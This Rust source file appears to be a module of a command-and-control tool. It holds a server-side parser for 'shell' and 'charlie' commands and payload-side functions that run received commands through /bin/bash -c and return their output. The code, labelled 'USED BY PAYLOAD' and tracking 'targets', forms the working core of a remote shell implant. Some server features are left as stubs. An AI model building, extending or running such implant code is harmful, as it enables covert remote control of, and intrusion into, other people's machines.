use std::{
    str,
    process::{Command, Output}
};

pub struct Target {
    pub stream: std::net::TcpStream,
    pub os: String,
}

pub fn parse_command (command: String) -> String { // USED BY SERVER
    let mut command = command.split(" ");
    let command_type = command.next().unwrap();
    let data_to_write;
    match command_type {
        "shell" => {
            let shell_command = command.remainder().unwrap().trim();
            data_to_write = String::from(shell_command);
        },
        "charlie" => {
            let charlie_command = command.remainder().unwrap().trim();
            match charlie_command {
                "show targets" => {
                    println!("to do");
                    // charlie_execute_show_targets(stream);
                    data_to_write = String::from("\0");
                },
                _ => todo!()
            };
        },
        _ => {
            println!("{} is not a recognized command.", command_type.trim());
            data_to_write = String::from("\0");
        }
    };
    return data_to_write
}

// fn charlie_execute_show_targets (stream: &TcpStream) { // USED BY SERVER
//     let targets = stream.peer_addr();
//     match targets {
//         Ok(target) => println!("{target}"),
//         Err(_) => println!("No targets currently exist")
//     };
// }

fn shell_execute_command(data: &[u8]) -> Output { // USED BY PAYLOAD
    let command = Command::new("/bin/bash")
        .arg("-c")
        .arg(str::from_utf8(&data).unwrap())
        .output()
        .unwrap();

    return command;
}

pub fn handle_command_len(data: &[u8]) -> String { // USED BY PAYLOAD

    let data_to_write;

    if (data.len() == 1) && (data[0] == 0) {
        data_to_write = String::from("\0");
    } else {
        let command = shell_execute_command(data);

        if command.status.success() == true { // ensure command success
            let raw = command.stdout;
            let output = str::from_utf8(&raw).unwrap();
    
            if output.len() > 0 {
                data_to_write = String::from(output);
            } else {
                data_to_write = String::from("\0");
            }
        } else { // catch command error
            let raw = command.stderr;
            let output = str::from_utf8(&raw).unwrap();
    
            if output.len() > 0 {
                data_to_write = String::from(output);
            } else {
                data_to_write = String::from("[UNKNOWN ERROR]\n");
            }
        }
    }
    return data_to_write
}
